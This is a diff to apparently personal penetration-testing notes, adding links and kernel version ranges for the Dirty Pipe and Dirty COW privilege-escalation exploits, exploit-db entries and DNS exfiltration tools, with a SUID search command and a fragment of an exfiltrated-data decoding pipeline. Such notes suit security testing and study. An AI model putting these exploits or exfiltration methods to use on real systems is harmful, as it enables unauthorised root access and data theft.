@@ -240,8 +240,13 @@ find / -perm -u=s -type f 2>/dev/null
 
 ### pocs
 
-- ~/code/src/pocs/dirtycow/dirty.c
-    - ~/code/src/pocs/cowroot.c
+- [The Dirty Pipe Vulnerability &\#8212; The Dirty Pipe Vulnerability  documentation](https://dirtypipe.cm4all.com/)
+    - gt 5.8, lt 5.16.11, 5.15.25, 5.10.102
+    - ~/code/src/pocs/dirtypipe/exp.c
+- [Dirty COW \(CVE\-2016\-5195\)](https://dirtycow.ninja/)
+    - gt 2.6.22, lt 4.8.3, 4.7.9, 4.4.26
+    - ~/code/src/pocs/dirtycow/dirty.c
+        - ~/code/src/pocs/cowroot.c
 - [Linux Kernel 2\.4\.x/2\.6\.x \(CentOS 4\.8/5\.3 / RHEL 4\.8/5\.3 / SuSE 10 SP2/11 / Ubuntu 8\.10\) \(PPC\) \- &\#039;sock\_sendpage\(\)&\#039; Local Privilege Escalation \- Linux local Exploit](https://www.exploit-db.com/exploits/9545)
 - [Linux Kernel 2\.6 &lt; 2\.6\.19 \(White Box 4 / CentOS 4\.4/4\.5 / Fedora Core 4/5/6 x86\) \- &\#039;ip\_append\_data\(\)&\#039; Ring0 Privilege Escalation \(1\) \- Linux\_x86 local Exploit](https://www.exploit-db.com/exploits/9542)
 
@@ -298,11 +303,11 @@ find / -perm -u=s -type f 2>/dev/null
             | uniq \
             | xxd -r -p > loremipsum.txt
         ```
-    - https://github.com/yarrick/iodine
-    - https://github.com/leonjza/dnsfilexfer
-    - https://github.com/vp777/DNS-data-exfiltration
-    - https://github.com/coryschwartz/dns_exfiltration
-    - https://hinty.io/devforth/dns-exfiltration-of-data-step-by-step-simple-guide/
+    - [GitHub \- yarrick/iodine: Official git repo for iodine dns tunnel](https://github.com/yarrick/iodine)
+    - [GitHub \- leonjza/dnsfilexfer: File transfer via DNS](https://github.com/leonjza/dnsfilexfer)
+    - [GitHub \- vp777/procrustes: A bash script that automates the exfiltration of data over dns in case we have blind command execution on a server with egress filtering](https://github.com/vp777/DNS-data-exfiltration)
+    - [GitHub \- coryschwartz/dns\_exfiltration: Simple DNS exfiltration using base64\-encoded URL&\#39;s](https://github.com/coryschwartz/dns_exfiltration)
+    - [hinty.io \- devforth \- DNS exfiltration of data: step\-by\-step simple guide](https://hinty.io/devforth/dns-exfiltration-of-data-step-by-step-simple-guide/)
 - TCP
     ```bash
     # ICMP (using file contents)
